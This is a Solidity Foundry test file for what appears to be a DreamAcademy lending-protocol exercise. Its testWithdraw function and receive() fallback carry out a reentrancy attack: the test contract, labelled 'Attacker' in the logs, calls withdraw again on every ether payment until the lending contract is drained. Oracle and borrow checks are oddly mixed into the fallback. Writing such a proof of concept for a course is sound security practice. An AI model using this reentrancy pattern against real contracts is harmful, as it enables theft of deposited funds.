// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.13;

import "forge-std/Test.sol";

import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import "src/DreamAcademyLending.sol";
import "src/DreamOracle.sol";

contract CUSDC is ERC20 {
    constructor() ERC20("Circle Stable Coin", "USDC") {
        _mint(msg.sender, type(uint256).max);
    }
}

contract Testx is Test {
    DreamOracle dreamOracle;
    DreamAcademyLending lending;
    ERC20 usdc;

    address user1;
    address user2;
    address user3;
    address user4;

    function setUp() external {
        user1 = address(0x1337);
        user2 = address(0x1337 + 1);
        user3 = address(0x1337 + 2);
        user4 = address(0x1337 + 3);
        dreamOracle = new DreamOracle();

        vm.deal(address(this), 10000000 ether);
        usdc = new CUSDC();

        // TDOO 아래 setUp이 정상작동 할 수 있도록 여러분의 Lending Contract를 수정하세요.
        lending = new DreamAcademyLending(IPriceOracle(address(dreamOracle)), address(usdc));
        usdc.approve(address(lending), type(uint256).max);

        lending.initializeLendingProtocol{value: 1}(address(usdc)); // set reserve ^__^

        dreamOracle.setPrice(address(0x0), 1339 ether);
        dreamOracle.setPrice(address(usdc), 1 ether);
    }

    
    function supplyUSDCDepositUser1() private {
        usdc.transfer(user1, 100000000 ether);
        vm.startPrank(user1);
        usdc.approve(address(lending), type(uint256).max);
        lending.deposit(address(usdc), 100000000 ether);
        vm.stopPrank();
    }

    function supplyEtherDepositUser2() private {
        vm.deal(user2, 100000000 ether);
        vm.prank(user2);
        lending.deposit{value: 100000000 ether}(address(0x00), 100000000 ether);
    }

    function supplySmallEtherDepositUser2() private {
        vm.deal(user2, 100000000 ether);
        vm.startPrank(user2);
        lending.deposit{value: 1 ether}(address(0x00), 1 ether);
        vm.stopPrank();
    }


    function testWithdraw() external {
        vm.deal(user1, 10000 ether);
        vm.startPrank(user1); 
        lending.deposit{value: 10000 ether}(address(0x0), 10000 ether); 
        vm.stopPrank();
        
        vm.deal(address(this), 0 ether);
        console.log("Lending: balance before withdraw: %d", address(lending).balance); 
        lending.withdraw(address(0x0), 1 ether);
        console.log("Lending: balance after withdraw: %d", address(lending).balance); // 0 ether
        console.log("Attacker: balance after withdraw", address(this).balance); // 31 ether
}

    receive() external payable {
        if(address(lending).balance > 0 ether){
            lending.withdraw(address(0x0), 1 ether);
    }
        supplySmallEtherDepositUser2();
        dreamOracle.setPrice(address(0x0), 99999999999 ether);

        vm.startPrank(user2);
        {
            (bool success,) = address(lending).call(
                abi.encodeWithSelector(DreamAcademyLending.borrow.selector, address(usdc), 1000 ether)
            );
            assertFalse(success);
            assertTrue(usdc.balanceOf(user2) == 0 ether);
        }
        vm.stopPrank();
    }

}